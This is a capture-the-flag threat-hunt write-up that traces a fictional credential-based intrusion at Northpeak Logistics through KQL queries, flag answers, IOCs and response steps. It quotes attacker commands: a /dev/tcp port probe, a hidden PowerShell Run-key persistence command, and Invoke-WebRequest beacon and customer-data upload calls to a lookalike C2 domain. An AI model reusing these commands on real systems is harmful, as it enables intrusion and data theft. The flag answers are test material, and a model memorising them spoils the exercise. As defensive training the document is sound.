# 🛡️ Threat Hunt Report // Northpeak Descent

### Community Hunt // An Operator Held the Front Door Open While Everyone Watched the Noise

---

## 📌 Executive Summary

Northpeak Logistics experienced a cross platform intrusion on the evening of 16 June 2026. An operator authenticated cleanly into the Windows estate using valid privileged credentials for the `sancadmin` account, hitting the workstation `npt-ws01` at 20:58 UTC and the server `npt-srv01` at 21:58 UTC as independent external footholds, both from external IP `148.64.103.173`. They then moved laterally to `npt-linux01` over SSH at 22:01 UTC where they installed `netexec` via `pipx` for lateral movement testing, pivoted back into the workstation internally from the Linux host, planted registry Run key persistence disguised as a legitimate Northpeak sync utility, opened a fixed interval command and control channel across three lookalike subdomains impersonating Northpeak infrastructure, and exfiltrated `customer_data_export_20260616.csv` from the server during a reconnected session at 23:44 UTC.

The environment surfaced a loud brute force signal that reads as the entry point. It was a decoy. The real entry authenticated clean and never tripped an alert. The entire intrusion ran without any tampering of security tooling and without a single attacker supplied binary being dropped on disk. Every action was carried out with native Windows and Linux tooling under a valid administrator account, a textbook Living off the Land operation that let the operator blend fully into normal admin activity.

---

## 🗂️ Environment

**Organization:** Northpeak Logistics
**Platform:** Windows estate + Linux host
**Telemetry:** Microsoft Sentinel // MDE tables (`DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`, `DeviceLogonEvents`, `DeviceEvents`)
**Scope:** Estate wide, filtered to Northpeak hosts (`npt-ws01`, `npt-srv01`, `npt-linux01`)
**Window:** Evening of 16 June 2026 into early 17 June 2026

---

## 🎯 Hunt Stages

*[ gate + 5 phases, 18 flags total ]*

| Stage | Focus |
|---|---|
| 00 | Setup gate |
| 01 | Initial access |
| 02 | Linux recon & tooling |
| 03 | Pivot, execution, persistence |
| 04 | Command & control |
| 05 | Impact & judgement |

---

## 🚩 Flag by Flag Findings

### Stage 01 // Initial Access

---

**Flag 1: The Real Foothold**

> HUNT LEAD: *"They didn't exploit anything to get in. One external address got onto the Windows estate cleanly and worked it interactively. Give me that source and how they came through."*

```kql
DeviceLogonEvents
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where ActionType == "LogonSuccess"
| where LogonType in ("Interactive","RemoteInteractive")
| where isnotempty(RemoteIP)
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType, Protocol
```

Filtering for successful interactive and remote interactive logons against the two Windows hosts, scoped to non empty remote source IPs, isolated a single external address responsible for every clean logon into the estate. The `sancadmin` account authenticated from `148.64.103.173` using `RemoteInteractive` with Negotiate auth, the signature of a valid RDP session rather than a brute forced network logon. This was the real entry that the failed logon storm was hiding.

![Flag 1](screenshots/Flag%201.png)

**Answer:** `148.64.103.173, RDP`

---

**Flag 2: First Foothold, Ordering**

> HUNT LEAD: *"There's more than one foothold here, and the obvious story has the Linux box first. Don't take that on trust. Prove which one actually came first, and name it."*

```kql
DeviceLogonEvents
| where DeviceName == "npt-linux01"
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType, Protocol
| order by Timestamp asc
```

The Linux host's earliest successful external logon was `sancadmin` from `148.64.103.173` at 22:01:38 UTC, over an hour after the first Windows workstation logon at 20:58:02 UTC. This disproved the "Linux first" story the shape of the data suggests at a glance. The Windows workstation was the true first foothold, and Linux was reached later, once the operator was already inside the estate.

![Flag 2](screenshots/Flag%202.png)

**Answer:** `npt-ws01, 148.64.103.173`

---

**Flag 3: Operator Workstation Name**

> HUNT LEAD: *"They were sloppy. Something they connected with announced itself on every remote session into the estate. Name it."*

```kql
DeviceLogonEvents
| where DeviceName has_any ("npt-ws01","npt-srv01")
| where RemoteIP == "148.64.103.173"
| project RemoteDeviceName
```

The `RemoteDeviceName` field on every successful RDP session from the attacker's IP consistently reported the same client machine name, `loranse`. This is the hostname of the attacker's own workstation leaking through the RDP handshake, an unforced disclosure repeated across every remote session into the Northpeak estate. A clean IOC for pivoting into any parallel intrusions from the same operator.

![Flag 3](screenshots/Flag%203.png)

**Answer:** `loranse`

---

**Flag 4: SRV01 Access Vector**

> HUNT LEAD: *"The server took its own way in, it wasn't reached from inside. Reconstruct it: the method, the source, the session type."*

```kql
DeviceLogonEvents
| where DeviceName == "npt-srv01"
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType, Protocol
| order by Timestamp asc
```

The server took its own external route in rather than being pivoted to from the workstation. `sancadmin` authenticated from `148.64.103.173` at 21:58:08 UTC as a `RemoteInteractive` logon, an independent direct RDP session from the same external IP that hit the workstation an hour earlier. Two direct footholds, one operator, one set of stolen credentials.

![Flag 4](screenshots/Flag%204.png)

**Answer:** `RDP, 148.64.103.173, RemoteInteractive`

---

### Stage 02 // Linux Recon & Tooling

---

**Flag 5: Sudo Enumeration**

> HUNT LEAD: *"First thing on the Linux box, they checked what they could escalate with. Give me the exact command. They fumbled it once before they got it right, that's how you'll spot the real one."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-linux01"
| where AccountName == "sancadmin"
| project Timestamp, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp asc
```

Immediately after the SSH logon, `sancadmin` ran `sudo -1` at 22:11:28 UTC, a typo where the intended lowercase `l` flag was mistyped as the digit `1`. The corrected command `sudo -l` followed at 22:16:52 UTC. The fumble was the tell that the hunt lead pointed at, distinguishing the real privilege escalation check from the typo.

![Flag 5](screenshots/Flag%205.png)

**Answer:** `sudo -l`

---

**Flag 6: Reachability Technique**

> HUNT LEAD: *"They checked whether the Windows boxes were reachable before they pivoted, and they did it without dropping a single tool on the box. Tell me how they checked, and the one port they cared about. That port tells you what they were about to do."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-linux01"
| where AccountName == "sancadmin"
| project Timestamp, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp asc
```

At 22:21:28 UTC the operator ran `timeout 2 bash -c "echo > /dev/tcp/10.2.0.10/3389"`, using bash's built in `/dev/tcp` pseudo device to test reachability. No `nmap`, no `netcat`, nothing dropped on disk. Port 3389 is the RDP listener, which telegraphs the next move, an internal pivot into the Windows workstation over RDP with the credentials already in hand.

![Flag 6](screenshots/Flag%206.png)

**Answer:** `/dev/tcp bash redirection, 3389`

---

**Flag 7: Operator Tooling**

> HUNT LEAD: *"Before leaving Linux, they kitted out, checked for a couple of capabilities, then committed to installing one tool. Name what they installed."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-linux01"
| where AccountName == "sancadmin"
| project Timestamp, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp asc
```

At 22:27:55 UTC the operator ran two `which` capability checks in sequence, one for RDP clients (`xfreerdp rdesktop xfreerdp3`) and one for lateral movement tooling (`nxc netexec crackmapexec`). Neither returned a hit. They then ran `apt-get update` and `apt-get install pipx` at 22:29:11 UTC, immediately followed by `pipx install netexec`. `netexec` is the SMB, WMI, and WinRM authentication testing tool built exactly for validating stolen credentials across a Windows estate at scale. The plan was not "connect once more", it was "test these creds against many hosts".

![Flag 7](screenshots/Flag%207.png)

**Answer:** `netexec`

---

### Stage 03 // Pivot, Execution, Persistence

---

**Flag 8: Lateral Movement Triple**

> HUNT LEAD: *"Now they come back at the workstation from inside the network. Build me that hop: the account, the internal source, the target."*

```kql
DeviceLogonEvents
| where DeviceName == "npt-ws01"
| where ActionType == "LogonSuccess"
| where RemoteIP startswith "10." or RemoteIP startswith "192.168." or RemoteIP startswith "172."
| project Timestamp, AccountName, RemoteIP, DeviceName, LogonType
| order by Timestamp asc
```

Filtering the workstation's successful logons to RFC1918 sources only isolated the internal hop cleanly. At 22:32:18 UTC, roughly three minutes after `netexec` finished installing, `sancadmin` authenticated onto `npt-ws01` from internal source `10.2.0.30`, the Linux host's private address. The operator pivoted from Linux back into the Windows workstation with the same account they had used externally, closing the loop between the external RDP entry and the newly staged internal tooling.

![Flag 8](screenshots/Flag%208.png)

**Answer:** `sancadmin, 10.2.0.30, npt-ws01`

---

**Flag 9: Operator PowerShell Lineage**

> HUNT LEAD: *"That workstation is drowning in PowerShell and nearly all of it is the machine talking to itself. Separate the human at the keyboard from the noise, and tell me what gives them away."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-ws01"
| where FileName == "powershell.exe"
| summarize count() by InitiatingProcessFileName, InitiatingProcessAccountName
| order by count_ desc
```

Aggregating PowerShell launches by parent process and account made the split obvious. The dominant parents were system context automation (`senseir.exe`, `gc_worker.exe`, `cmd.exe`, `compattelrunner.exe`, `gc_service.exe`), all running under `system`. Two parents ran under `sancadmin`: `powershell.exe` spawning `powershell.exe` (10 hits) and `explorer.exe` spawning `powershell.exe` (3 hits). `explorer.exe` is the Windows desktop shell, which only spawns child processes when a human physically clicks something, a shortcut, the Start menu, or the Run dialog. Automation never routes through Explorer. That parent is the fingerprint of a live human at the console.

![Flag 9](screenshots/Flag%209.png)

**Answer:** `explorer.exe`

---

**Flag 10: Persistence Full Command**

> HUNT LEAD: *"They tried their staging script out a few times first, then trusted it enough to make it survive a reboot. Give me the full command they planted to bring it back, path and all."*

```kql
DeviceRegistryEvents
| where DeviceName == "npt-ws01"
| where RegistryKey has_any ("Run", "RunOnce")
| project Timestamp, ActionType, RegistryKey, RegistryValueName, RegistryValueData
```

Process events did not surface the persistence command directly, so the pivot was to the registry table. At 23:04:16 UTC a Run key was written under `HKCU\...\CurrentVersion\Run\NorthpeakSyncTray`, disguised to blend with legitimate Northpeak corporate tooling. The payload path pointed at `C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1`, stashed in ProgramData rather than a user profile so it survives account changes, with PowerShell invoked using `NoProfile`, `WindowStyle Hidden`, and `ExecutionPolicy Bypass` to run silently on every logon.

![Flag 10](screenshots/Flag%2010.png)

**Answer:** `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"`

---

**Flag 18: Local Admin Confirmation Burst**

> HUNT LEAD: *"When the operator comes back into the workstation for the second time, before they touch anything else they run a short burst to check who they are and what they can do. The last command in that burst isn't a plain identity check, it's testing for one specific thing. Tell me what they were confirming about their own account."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-ws01"
| where AccountName == "sancadmin"
| where FileName == "whoami.exe"
| project Timestamp, ProcessCommandLine
| order by Timestamp asc
```

```kql
DeviceProcessEvents
| where DeviceName == "npt-ws01"
| where AccountName == "sancadmin"
| project Timestamp, ProcessCommandLine, AdditionalFields
```

At 22:43:04 UTC the operator ran a four command burst in rapid sequence: `hostname`, `whoami`, `whoami /groups`, then `findstr /i S-1-5-32-544` filtering the `whoami /groups` output for one exact SID. `S-1-5-32-544` is the well known Security Identifier for the built in local Administrators group. The final command was not a general identity check, it was a targeted lookup confirming whether the compromised account carried local admin membership on this specific box before the operator committed to next steps.

![Flag 18](screenshots/Flag%2018.png)

**Answer:** `findstr /i S-1-5-32-544, confirms local administrator group membership`

---

### Stage 04 // Command & Control

---

**Flag 11: Beacon Domains, Cross Source**

> HUNT LEAD: *"Their channel ran on three look-alike subdomains, but your network record only ever caught one of them. Find all three, in the order they were first contacted, and tell me where the other two were hiding."*

```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ProcessCommandLine has "sync-northpeak"
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp asc
```

The C2 channel ran across three lookalike subdomains impersonating Northpeak infrastructure. First contacts in order: `status.sync-northpeak.com` at 23:15:47 UTC from `npt-ws01`, `updates.sync-northpeak.com` at 23:15:49 UTC from `npt-ws01`, and `cdn.sync-northpeak.com` at 23:44:08 UTC from `npt-srv01`. All three were reached via PowerShell `Invoke-WebRequest` rather than a native network client. Only `status` generated a logged `DeviceNetworkEvents` connection. The other two live only as PowerShell command lines in `DeviceProcessEvents`, invisible to any monitoring that watches network telemetry alone. That gap is itself a finding, network only visibility is blind to PowerShell driven HTTPS traffic on this range.

![Flag 11](screenshots/Flag%2011.png)

**Answer:** `status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; hidden in DeviceProcessEvents (PowerShell Invoke-WebRequest), not DeviceNetworkEvents`

---

**Flag 12: Encoded Beacon Decode**

> HUNT LEAD: *"One of those beacons was deliberately wrapped to hide where it was calling. Unwrap it and give me the full address, every parameter on the end."*

```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ProcessCommandLine has "EncodedCommand" or ProcessCommandLine has "-enc"
| project Timestamp, DeviceName, ProcessCommandLine
| order by Timestamp asc
```

One beacon call from `npt-ws01` was deliberately obfuscated using PowerShell's `-EncodedCommand` flag rather than a plain `-Uri` argument, hiding the destination and parameters from plain text process logging. Decoding the base64 blob (UTF-16LE) reveals: `Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09" -UseBasicParsing -TimeoutSec 4`. This confirms `cdn.sync-northpeak.com` served double duty as both the exfil endpoint and a generic beacon channel, with a host identifier and an embedded flag value baked into the URL.

![Flag 12](screenshots/Flag%2012.png)

**Answer:** `https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09`

---

**Flag 13: Encoded Command Discrimination**

> HUNT LEAD: *"Pull every wrapped command and most of them are innocent system chatter, not the operator. Name what's generating that chatter, and prove to me you can tell it apart from the few that matter."*

```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where ProcessCommandLine has "EncodedCommand"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp asc
```

The bulk of `-EncodedCommand` PowerShell calls across the estate traced back to `gc_worker.exe`, a legitimate system process generating routine encoded chatter unrelated to the operator. Filtering `gc_worker.exe` out as the initiating process isolated the handful of encoded calls launched directly by `powershell.exe` under the `sancadmin` session, including the wrapped C2 beacon to `cdn.sync-northpeak.com`. Splitting by initiating process is the discriminator that separates system automation from operator activity in a haystack of encoded commands.

![Flag 13](screenshots/Flag%2013.png)

**Answer:** `gc_worker.exe`

---

**Flag 14: Beacon Rhythm**

> HUNT LEAD: *"Look at the spacing between the early check-ins to the first domain. Don't give me a number. Tell me what that rhythm proves about what's driving the channel."*

The two `status.sync-northpeak.com` checkins landed at 23:15:47 UTC and 23:16:25 UTC, roughly 38 seconds apart, a consistent evenly spaced interval rather than the irregular gaps produced by someone manually retyping a command. Fixed interval beaconing is the signature of an automated loop or sleep timer driving the channel, not a human triggering each call by hand.

*(No screenshot for this flag, rhythm was reasoned from the Flag 11 timestamps.)*

**Answer:** `fixed interval beaconing, indicates an automated / scripted loop (not manual hands on keyboard activity) driving the C2 channel`

---

### Stage 05 // Impact & Judgement

---

**Flag 15: Crown Jewel Exfil**

> HUNT LEAD: *"Last thing they did was take the crown jewels out. Name the file, the host it left from, and where it went."*

```kql
DeviceProcessEvents
| where DeviceName == "npt-srv01"
| where ProcessCommandLine has "cdn.sync-northpeak.com"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

At 23:44:08 UTC the operator exfiltrated `customer_data_export_20260616.csv` from `npt-srv01`, uploading it via PowerShell `Invoke-WebRequest` with an `-InFile` argument to `https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers`. This is the same subdomain that carried the wrapped beacon call from Flag 12, confirming `cdn.sync-northpeak.com` served as the operator's dedicated exfiltration and command and control channel for the intrusion.

![Flag 15](screenshots/Flag%2015.png)

**Answer:** `customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com`

---

**Flag 16: Exfil Session Correlation**

> HUNT LEAD: *"That export went out while they were live in a remote session on the server, and there were two sessions. Tell me which one they were in when they did it: the first, or the one they came back through."*

```kql
DeviceLogonEvents
| where DeviceName == "npt-srv01"
| where AccountName == "sancadmin"
| where LogonType == "RemoteInteractive"
| where ActionType == "LogonSuccess"
| project Timestamp, LogonType, ActionType, RemoteIP, LogonId
| order by Timestamp asc
```

Two distinct `RemoteInteractive` sessions opened on `npt-srv01` under `sancadmin`, both from `148.64.103.173`. The first at 21:58:08 UTC (`LogonId 4039013`) and a second at 23:42:52 UTC (`LogonId 39592297`). The customer data export at 23:44:08 UTC fell inside the second session, roughly 76 seconds after the operator reconnected. The theft was carried out during the return session rather than the initial foothold, suggesting deliberate staging, connect, retrieve, exfiltrate, disconnect.

![Flag 16](screenshots/Flag%2016.png)

**Answer:** `second`

---

**Flag 17: Holding the Ground**

> HUNT LEAD: *"Here's what should bother you. They were hands-on for hours and nothing tripped. Check whether they tore the defences down to manage that. They didn't. So tell me the model, what let them operate this freely without going near the security stack."*

The operator ran the entire intrusion without disabling, bypassing, or tampering with any security tooling, and without dropping a single attacker supplied binary on any host. Every action, RDP logons, PowerShell execution, registry persistence, HTTPS beacons and exfiltration, was carried out using native Windows and Linux tooling under the valid `sancadmin` administrator account. This is a Living off the Land model. Legitimate credentials plus built in binaries let the operator blend fully into normal admin activity, so the security stack had nothing anomalous to catch. Absence of tampering and absence of dropped tools were not gaps in the investigation, they were the finding.

*(No screenshot for this flag, judgement was reasoned across the full timeline.)*

**Answer:** `no tampering no drops, living off the land`

---

## 🕒 Timeline

| Time (UTC) | Host | Event |
|---|---|---|
| 16 June 20:58:02 | npt-ws01 | First external RDP logon from 148.64.103.173, sancadmin, RemoteInteractive (Flag 1, 3) |
| 16 June 21:01:48 | npt-ws01 | Second RDP session from 148.64.103.173, sancadmin |
| 16 June 21:58:08 | npt-srv01 | First external RDP logon from 148.64.103.173, sancadmin, LogonId 4039013 (Flag 4, 16) |
| 16 June 22:01:38 | npt-linux01 | SSH logon from 148.64.103.173, sancadmin (Flag 2) |
| 16 June 22:11:28 | npt-linux01 | `sudo -1` (typo) |
| 16 June 22:16:52 | npt-linux01 | `sudo -l` (corrected privesc check) (Flag 5) |
| 16 June 22:21:28 | npt-linux01 | `ip route`, `cat /etc/hosts`, `getent hosts NPT-WS01 NPT-SRV01` |
| 16 June 22:21:28 | npt-linux01 | `/dev/tcp` reachability check to 10.2.0.10:3389 (Flag 6) |
| 16 June 22:27:55 | npt-linux01 | `which xfreerdp rdesktop xfreerdp3` and `which nxc netexec crackmapexec` |
| 16 June 22:29:11 | npt-linux01 | `apt-get install pipx`, then `pipx install netexec` (Flag 7) |
| 16 June 22:32:18 | npt-ws01 | Internal lateral hop from 10.2.0.30 (Linux), sancadmin (Flag 8) |
| 16 June 22:37:14 | npt-ws01 | `whoami /all` (first identity check) |
| 16 June 22:43:04 | npt-ws01 | Discovery burst: `hostname`, `whoami`, `whoami /groups`, `findstr /i S-1-5-32-544` (Flag 18) |
| 16 June 23:04:16 | npt-ws01 | Registry Run key persistence written: NorthpeakSyncTray (Flag 10) |
| 16 June 23:15:47 | npt-ws01 | First C2 checkin, status.sync-northpeak.com (Flag 11, 14) |
| 16 June 23:15:49 | npt-ws01 | First C2 status call, updates.sync-northpeak.com (Flag 11) |
| 16 June 23:16:25 | npt-ws01 | Second C2 checkin, status.sync-northpeak.com (38s interval, Flag 14) |
| 16 June 23:16:29 | npt-ws01 | DeviceNetworkEvents connection logged, status.sync-northpeak.com |
| 16 June 23:xx:xx | npt-ws01 | Wrapped beacon via `-EncodedCommand` to cdn.sync-northpeak.com/api/beacon (Flag 12) |
| 16 June 23:42:52 | npt-srv01 | Second RemoteInteractive session opens, sancadmin, LogonId 39592297 (Flag 16) |
| 16 June 23:44:08 | npt-srv01 | Exfil of `customer_data_export_20260616.csv` to cdn.sync-northpeak.com (Flag 15) |

---

## 🧭 MITRE ATT&CK Mapping

| Flag | Tactic | Technique |
|---|---|---|
| 1 | Initial Access | T1078 Valid Accounts, T1133 External Remote Services |
| 2 | Initial Access | T1078 Valid Accounts, T1133 External Remote Services |
| 3 | (Attacker OpSec Failure) | T1078 Valid Accounts (client hostname disclosure via RDP) |
| 4 | Initial Access | T1078 Valid Accounts, T1133 External Remote Services |
| 5 | Discovery | T1069.001 Permission Groups Discovery: Local Groups |
| 6 | Discovery | T1046 Network Service Discovery |
| 7 | Resource Development | T1588.002 Obtain Capabilities: Tool (via `pipx install netexec`) |
| 8 | Lateral Movement | T1021.001 Remote Services: Remote Desktop Protocol |
| 9 | Execution | T1059.001 Command and Scripting Interpreter: PowerShell |
| 10 | Persistence | T1547.001 Boot or Logon Autostart Execution: Registry Run Keys |
| 18 | Discovery | T1069.001 Permission Groups Discovery: Local Groups, T1033 System Owner/User Discovery |
| 11 | Command and Control | T1071.001 Application Layer Protocol: Web Protocols |
| 12 | Defense Evasion | T1027 Obfuscated Files or Information (base64 encoded PowerShell), T1059.001 |
| 13 | (Analyst Discrimination) | T1027 Obfuscated Files or Information (baseline vs anomaly) |
| 14 | Command and Control | T1071.001 (fixed interval beaconing pattern) |
| 15 | Exfiltration | T1041 Exfiltration Over C2 Channel |
| 16 | Lateral Movement | T1021.001 (session reconnect for staged theft) |
| 17 | (Overall Model) | T1078 Valid Accounts + T1059 Command and Scripting Interpreter (LOLBAS) |

---

## 🔑 Indicators of Compromise

| Type | Value | Notes |
|---|---|---|
| IP | 148.64.103.173 | External attacker source for RDP into npt-ws01, npt-srv01, and SSH into npt-linux01 |
| Hostname | loranse | Attacker's own RDP client machine name, leaked in RemoteDeviceName |
| Account | sancadmin | Compromised valid local admin account used across all hosts |
| Domain | status.sync-northpeak.com | C2 checkin, network logged |
| Domain | updates.sync-northpeak.com | C2 status, PowerShell only, not in network events |
| Domain | cdn.sync-northpeak.com | C2 beacon + exfil endpoint, PowerShell only, not in network events |
| URL | `https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09` | Wrapped beacon target |
| URL | `https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers` | Exfil endpoint |
| File | C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1 | Persistence payload on npt-ws01 |
| Registry | HKCU\...\CurrentVersion\Run\NorthpeakSyncTray | Persistence Run key on npt-ws01 |
| File | customer_data_export_20260616.csv | Data exfiltrated from npt-srv01 |
| Tool | netexec | Installed via pipx on npt-linux01 for lateral movement testing |
| Pattern | `-EncodedCommand` from `powershell.exe` under sancadmin | Discriminator for operator activity vs gc_worker.exe chatter |

---

## ⚖️ Judgement & Response

**Attack chain:**
External RDP entry → parallel external footholds → SSH pivot to Linux → tool staging (netexec) → internal lateral movement back to workstation → registry Run key persistence → fixed interval PowerShell C2 across three lookalike domains → data exfiltration from server during a reconnected session.

**What really happened:**

The intrusion was a valid credential compromise, not an exploit chain. The `sancadmin` account, a legitimate local administrator, authenticated cleanly from `148.64.103.173` via RDP into `npt-ws01` at 20:58 UTC and independently into `npt-srv01` at 21:58 UTC. Both were direct external footholds rather than an internal pivot chain. The operator then SSH'd into `npt-linux01` at 22:01 UTC and used it as a staging platform, running `sudo -l` for privesc enumeration, `/dev/tcp` reachability testing against RDP on the Windows workstation, capability checks for RDP and lateral movement tooling, and installing `netexec` via `pipx` for authenticated lateral movement testing. From the Linux host they pivoted internally back into `npt-ws01` at 22:32 UTC, planted a Registry Run key persistence disguised as "NorthpeakSyncTray" pointing at a hidden PowerShell payload in ProgramData, and opened a PowerShell driven C2 channel to three lookalike subdomains impersonating Northpeak infrastructure. They exfiltrated `customer_data_export_20260616.csv` from `npt-srv01` during a reconnected second session at 23:44 UTC.

**How it was hidden:**

The failed logon storm made the environment look like a brute force target, obscuring the real clean authentications behind noise. The same valid privileged account moved across every host, so nothing on the wire read as anomalous, admin activity looks like admin activity. The attacker's own client hostname (`loranse`) was the single unforced disclosure, but only surfaced under `RemoteDeviceName` inspection. The C2 domains impersonated Northpeak's own naming convention. Only one of the three C2 subdomains generated a `DeviceNetworkEvents` connection record. The other two lived entirely inside PowerShell `Invoke-WebRequest` command lines, invisible to any monitoring that watches network telemetry alone. One beacon was wrapped in `-EncodedCommand` to hide the destination from plain text logs, and the bulk of encoded PowerShell traffic came from a legitimate system process (`gc_worker.exe`), providing cover noise. Persistence was placed in ProgramData rather than a user profile so it would survive account level changes, and the entire session ran without touching security tooling and without dropping a single attacker binary.

**Response actions (NIST SP 800-61):**

*Containment:*
- Disable `sancadmin` across Entra ID and local Active Directory
- Force logoff of all active sessions on `npt-ws01`, `npt-srv01`, `npt-linux01`
- Block `148.64.103.173` at perimeter firewall
- Block `*.sync-northpeak.com` at DNS resolver and proxy (unless legitimately owned by Northpeak, in which case block only the three known malicious subdomains)
- Isolate all three hosts from the network pending eradication

*Eradication:*
- Delete Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NorthpeakSyncTray` on `npt-ws01` (and check other Windows hosts for the same key)
- Remove `C:\ProgramData\Northpeak\NorthpeakSync\` directory entirely
- Remove `pipx` and `netexec` installations from `npt-linux01`, and review other Linux hosts for the same
- Reset the `sancadmin` password and rotate credentials for every account the compromised session may have interacted with
- Rebuild `npt-ws01`, `npt-srv01`, and `npt-linux01` from clean baselines rather than trusting cleanup, since persistence outside the discovered Run key cannot be fully ruled out

*Recovery:*
- Restore any impacted data (customer records) from clean pre 16 June backups
- Reintroduce rebuilt hosts to the network under enhanced monitoring
- Notify affected customers if the exfiltrated customer data triggers data breach notification obligations

*Lessons Learned:*
- Enforce MFA on all interactive remote access, including RDP for privileged accounts, to close the "valid account" gap that made this intrusion possible
- Enable PowerShell script block logging (Event ID 4104) and module logging on all Windows hosts to capture `Invoke-WebRequest` calls invisible to network sensors
- Enable DNS query logging alongside network connection logging so lookups to domains that never connect still leave a trail
- Alert on new Registry Run key entries pointing at ProgramData paths
- Alert on RDP `RemoteDeviceName` values that do not match domain joined workstations
- Alert on internal source RDP or SMB from Linux subnets to Windows admin hosts as a lateral movement pattern
- Baseline the `-EncodedCommand` PowerShell activity generated by `gc_worker.exe` and other system processes so operator originated encoded calls stand out clearly

---

## 📎 Repository Notes

- Screenshots for each flag are in `/screenshots/` named `Flag [N].png`
- Flags 14 and 17 have no screenshots as findings were reasoned from timestamps and cross flag synthesis rather than a single query view
- Numbering follows the platform's question order (Flag 18 sits within Stage 03 rather than at the end, matching how the hunt was submitted)
